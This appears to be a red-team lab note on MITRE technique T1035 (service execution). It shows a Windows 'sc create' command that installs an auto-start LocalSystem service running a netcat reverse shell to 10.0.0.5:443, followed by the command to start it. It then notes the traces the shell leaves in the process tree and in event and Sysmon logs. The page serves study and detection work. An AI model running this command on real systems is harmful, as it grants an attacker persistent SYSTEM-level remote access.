# Service Execution

## Service Execution

### Execution

Creating an evil service with a netcat reverse shell:

{% code title="attacker\@victim" %}
```csharp
C:\> sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
[SC] CreateService SUCCESS
C:\> sc start evilsvc
```
{% endcode %}

### Observations

The reverse shell lives under services.exe as expected:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI1IJk9OjVi9DuSbQef%2F-LI1MdTMbAjZrV-CRPEu%2Fservices-nc.png?alt=media\&token=0d6c72b7-829e-4268-ac16-a25df08b278a)

Windows security, application, Service Control Manager and sysmon logs provide some juicy details:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI1PI-oXIj_f45mMKHj%2F-LI1PFjko7c0udlil1Z6%2Fservices-logs.png?alt=media\&token=76e29c88-6c81-41f1-bde2-5934a0a4744d)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI1PcZaAFE2klvKh3Jc%2F-LI1PaNQGlgVFBZqnfZx%2Fservices-shell.png?alt=media\&token=75704e74-c4f8-4c7e-b29e-0080d4d28bc9)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1035" %}
